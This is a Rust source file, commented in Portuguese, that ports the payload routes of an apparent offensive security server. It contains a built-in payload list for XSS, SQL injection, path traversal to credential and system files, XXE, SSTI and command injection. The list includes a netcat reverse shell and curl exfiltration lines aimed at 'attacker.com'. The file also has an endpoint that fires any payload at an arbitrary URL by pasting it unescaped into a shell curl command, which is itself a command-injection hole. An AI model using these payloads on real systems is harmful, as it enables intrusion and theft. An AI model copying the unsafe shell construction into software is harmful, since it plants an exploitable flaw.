//! Port 1:1 de `hexstrike_server/routes/payloads.py`.
//!
//! Inventário Python (ordem de definição) — checklist do shard W9.
//! NÃO invente símbolo: o que não está aqui não existe no monólito.
//!
//! ```text
//!    20  class AIPayloadGenerator:
//!   230  def ai_generate_payload
//!   260  def ai_test_payload
//! ```
//!
//! Rotas (`@app.route`) deste módulo (2):
//!
//! ```text
//!   229  ai_generate_payload("/api/ai/generate_payload", methods=["POST"])
//!   259  ai_test_payload("/api/ai/test_payload", methods=["POST"])
//! ```

use axum::http::StatusCode;
use axum::routing::post;
use axum::{Json, Router};
use serde_json::{json, Value};
use tracing::info;

use hexstrike_intelligence::exploit_gen::execute_command;
use hexstrike_intelligence::vuln_intel::iso_now;

/// `datetime.now().isoformat()` — microssegundos com 6 dígitos, hora local.
/// (O `timestamp` é volátil no harness de paridade; o formato existe para o
/// corpo da resposta ser o mesmo do Python.)

/// `jsonify(x)` (200) vs `jsonify(x), <status>` (≠200). O `Result` do axum
/// devolve o status só no ramo de erro, então o ramo 200 continua sendo
/// `Json<Value>`.
type ApiResult = Result<Json<Value>, (StatusCode, Json<Value>)>;

/// `AIPayloadGenerator.payload_templates[attack_type][complexity]`.
fn payload_templates(attack_type: &str) -> Option<&'static [(&'static str, &'static [&'static str])]> {
    Some(match attack_type {
        "xss" => &[
            (
                "basic",
                &[
                    "<script>alert('XSS')</script>",
                    "javascript:alert('XSS')",
                    "'><script>alert('XSS')</script>",
                ],
            ),
            (
                "advanced",
                &[
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
                    r#"\"><script>alert('XSS')</script><!--"#,
                    r#"<iframe src="javascript:alert('XSS')">"#,
                    "<body onload=alert('XSS')>",
                ],
            ),
            (
                "bypass",
                &[
                    "<ScRiPt>alert('XSS')</ScRiPt>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    r#"<img src="javascript:alert('XSS')">"#,
                    "<svg/onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<details ontoggle=alert('XSS')>",
                ],
            ),
        ],
        "sqli" => &[
            (
                "basic",
                &[
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "admin'--",
                    "' UNION SELECT NULL--",
                ],
            ),
            (
                "advanced",
                &[
                    "' UNION SELECT 1,2,3,4,5--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "' AND (SELECT SUBSTRING(@@version,1,10))='Microsoft'--",
                    "'; EXEC xp_cmdshell('whoami')--",
                    "' OR 1=1 LIMIT 1--",
                    "' AND 1=(SELECT COUNT(*) FROM tablenames)--",
                ],
            ),
            (
                "time_based",
                &[
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' OR (SELECT SLEEP(5))--",
                    "'; SELECT pg_sleep(5)--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                ],
            ),
        ],
        "lfi" => &[
            (
                "basic",
                &[
                    "../../../etc/passwd",
                    r"..\..\..\windows\system32\drivers\etc\hosts",
                ],
            ),
            (
                "advanced",
                &[
                    "....//....//....//etc/passwd",
                    "..%2F..%2F..%2Fetc%2Fpasswd",
                    r"....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
                    "/var/log/apache2/access.log",
                    "/proc/self/environ",
                    "/etc/passwd%00",
                ],
            ),
        ],
        "cmd_injection" => &[
            (
                "basic",
                &["; whoami", "| whoami", "& whoami", "`whoami`"],
            ),
            (
                "advanced",
                &[
                    "; cat /etc/passwd",
                    "| nc -e /bin/bash attacker.com 4444",
                    "&& curl http://attacker.com/$(whoami)",
                    "`curl http://attacker.com/$(id)`",
                ],
            ),
        ],
        "xxe" => &[(
            "basic",
            &[
                r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#,
                r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>"#,
            ],
        )],
        "ssti" => &[
            (
                "basic",
                &["{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>"],
            ),
            (
                "advanced",
                &[
                    "{{config}}",
                    "{{''.__class__.__mro__[2].__subclasses__()}}",
                    "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
                ],
            ),
        ],
        _ => return None,
    })
}

/// `AIPayloadGenerator` — "AI-powered payload generation system with contextual
/// intelligence". Os métodos do Python não usam estado, então aqui são
/// associados: a instância global `ai_payload_generator` não tem equivalente.
pub struct AIPayloadGenerator;

impl AIPayloadGenerator {
    /// `generate_contextual_payload(target_info)`
    pub fn generate_contextual_payload(
        attack_type: &str,
        complexity: &str,
        technology: &str,
    ) -> Value {
        // `target_tech = target_info.get("technology", "").lower()`
        let target_tech = technology.to_lowercase();

        // Get base payloads
        let payloads = Self::_get_payloads(attack_type, complexity);

        // Enhance payloads with context
        let enhanced_payloads = Self::_enhance_with_context(payloads, &target_tech);

        // Generate test cases
        let test_cases = Self::_generate_test_cases(&enhanced_payloads, attack_type);

        json!({
            "attack_type": attack_type,
            "complexity": complexity,
            "payload_count": enhanced_payloads.len(),
            "payloads": enhanced_payloads,
            "test_cases": test_cases,
            "recommendations": Self::_get_recommendations(attack_type),
        })
    }

    /// `_get_payloads(attack_type, complexity)`
    fn _get_payloads(attack_type: &str, complexity: &str) -> &'static [&'static str] {
        match payload_templates(attack_type) {
            Some(templates) => {
                if let Some((_, payloads)) = templates.iter().find(|(c, _)| *c == complexity) {
                    return payloads;
                }
                // Return basic payloads if complexity not found
                match templates.iter().find(|(c, _)| *c == "basic") {
                    Some((_, payloads)) => payloads,
                    None => &[],
                }
            }
            None => &["<!-- No payloads available for this attack type -->"],
        }
    }

    /// `_enhance_with_context(payloads, tech_context)`
    fn _enhance_with_context(payloads: &[&str], _tech_context: &str) -> Vec<Value> {
        let mut enhanced = Vec::new();

        for payload in payloads {
            // Basic payload
            enhanced.push(json!({
                "payload": payload,
                "context": "basic",
                "encoding": "none",
                "risk_level": Self::_assess_risk_level(payload),
            }));

            // URL encoded version
            let url_encoded = payload
                .replace(' ', "%20")
                .replace('<', "%3C")
                .replace('>', "%3E");
            enhanced.push(json!({
                "payload": url_encoded,
                "context": "url_encoded",
                "encoding": "url",
                // O risco é o do payload ORIGINAL (1:1 com o Python).
                "risk_level": Self::_assess_risk_level(payload),
            }));
        }

        enhanced
    }

    /// `_generate_test_cases(payloads, attack_type)`
    fn _generate_test_cases(payloads: &[Value], attack_type: &str) -> Vec<Value> {
        let mut test_cases = Vec::new();

        // Limit to 5 test cases
        for (i, payload_info) in payloads.iter().take(5).enumerate() {
            let payload = payload_info
                .get("payload")
                .and_then(Value::as_str)
                .unwrap_or("");
            test_cases.push(json!({
                "id": format!("test_{}", i + 1),
                "payload": payload,
                "method": if payload.chars().count() < 100 { "GET" } else { "POST" },
                "expected_behavior": Self::_get_expected_behavior(attack_type),
                "risk_level": payload_info.get("risk_level").cloned().unwrap_or(Value::Null),
            }));
        }

        test_cases
    }

    /// `_get_expected_behavior(attack_type)`
    fn _get_expected_behavior(attack_type: &str) -> &'static str {
        match attack_type {
            "xss" => "JavaScript execution or popup alert",
            "sqli" => "Database error or data extraction",
            "lfi" => "File content disclosure",
            "cmd_injection" => "Command execution on server",
            "ssti" => "Template expression evaluation",
            "xxe" => "XML external entity processing",
            _ => "Unexpected application behavior",
        }
    }

    /// `_assess_risk_level(payload)`
    fn _assess_risk_level(payload: &str) -> &'static str {
        let high_risk_indicators = ["system", "exec", "eval", "cmd", "shell", "password", "etc"];
        let medium_risk_indicators = ["script", "alert", "union", "select"];

        let payload_lower = payload.to_lowercase();

        if high_risk_indicators.iter().any(|i| payload_lower.contains(i)) {
            "HIGH"
        } else if medium_risk_indicators.iter().any(|i| payload_lower.contains(i)) {
            "MEDIUM"
        } else {
            "LOW"
        }
    }

    /// `_get_recommendations(attack_type)`
    fn _get_recommendations(attack_type: &str) -> Vec<&'static str> {
        match attack_type {
            "xss" => vec![
                "Test in different input fields and parameters",
                "Try both reflected and stored XSS scenarios",
                "Test with different browsers for compatibility",
            ],
            "sqli" => vec![
                "Test different SQL injection techniques",
                "Try both error-based and blind injection",
                "Test various database-specific payloads",
            ],
            "lfi" => vec![
                "Test various directory traversal depths",
                "Try different encoding techniques",
                "Test for log file inclusion",
            ],
            "cmd_injection" => vec![
                "Test different command separators",
                "Try both direct and blind injection",
                "Test with various payloads for different OS",
            ],
            _ => vec!["Test thoroughly", "Monitor responses"],
        }
    }
}

/// `@app.route("/api/ai/generate_payload", methods=["POST"])` —
/// `def ai_generate_payload()`.
pub async fn ai_generate_payload(Json(params): Json<Value>) -> ApiResult {
    let attack_type = params
        .get("attack_type")
        .and_then(Value::as_str)
        .unwrap_or("xss");
    let complexity = params
        .get("complexity")
        .and_then(Value::as_str)
        .unwrap_or("basic");
    let technology = params
        .get("technology")
        .and_then(Value::as_str)
        .unwrap_or("");
    // `target_info["url"]` existe no Python mas `generate_contextual_payload`
    // não lê a chave — não entra no port.

    info!("🤖 Generating AI payloads for {attack_type} attack");
    let result = AIPayloadGenerator::generate_contextual_payload(attack_type, complexity, technology);

    let payload_count = result
        .get("payload_count")
        .and_then(Value::as_i64)
        .unwrap_or(0);
    info!("✅ Generated {payload_count} contextual payloads");

    Ok(Json(json!({
        "success": true,
        "ai_payload_generation": result,
        "timestamp": iso_now(),
    })))
}

/// `@app.route("/api/ai/test_payload", methods=["POST"])` —
/// `def ai_test_payload()`.
pub async fn ai_test_payload(Json(params): Json<Value>) -> ApiResult {
    let payload = params
        .get("payload")
        .and_then(Value::as_str)
        .unwrap_or("");
    let target_url = params
        .get("target_url")
        .and_then(Value::as_str)
        .unwrap_or("");
    let method = params
        .get("method")
        .and_then(Value::as_str)
        .unwrap_or("GET");

    if payload.is_empty() || target_url.is_empty() {
        return Err((
            StatusCode::BAD_REQUEST,
            Json(json!({
                "success": false,
                "error": "Payload and target_url are required",
            })),
        ));
    }

    info!("🧪 Testing AI-generated payload against {target_url}");

    // Create test command based on method and payload
    let test_command = if method.to_uppercase() == "GET" {
        let encoded_payload = payload.replace(' ', "%20").replace('\'', "%27");
        format!("curl -s '{target_url}?test={encoded_payload}'")
    } else {
        format!("curl -s -X POST -d 'test={payload}' '{target_url}'")
    };

    // Execute test
    let result = execute_command(&test_command, false).await;

    // AI analysis of results
    let stdout = result.get("stdout").and_then(Value::as_str).unwrap_or("");
    let potential_vulnerability = stdout.to_lowercase().contains(&payload.to_lowercase());
    let analysis = json!({
        "payload_tested": payload,
        "target_url": target_url,
        "method": method,
        "response_size": stdout.chars().count(),
        "success": result.get("success").and_then(Value::as_bool).unwrap_or(false),
        "potential_vulnerability": potential_vulnerability,
        "recommendations": [
            "Analyze response for payload reflection",
            "Check for error messages indicating vulnerability",
            "Monitor application behavior changes",
        ],
    });

    info!("🔍 Payload test completed | Potential vuln: {potential_vulnerability}");

    Ok(Json(json!({
        "success": true,
        "test_result": result,
        "ai_analysis": analysis,
        "timestamp": iso_now(),
    })))
}

/// Rotas registradas neste módulo. O Python registra no import
/// (`@app.route`); aqui a montagem é explícita e na MESMA ordem de
/// `hexstrike_server/__init__.py`.
pub fn routes() -> Router {
    Router::new()
        .route("/api/ai/generate_payload", post(ai_generate_payload))
        .route("/api/ai/test_payload", post(ai_test_payload))
}

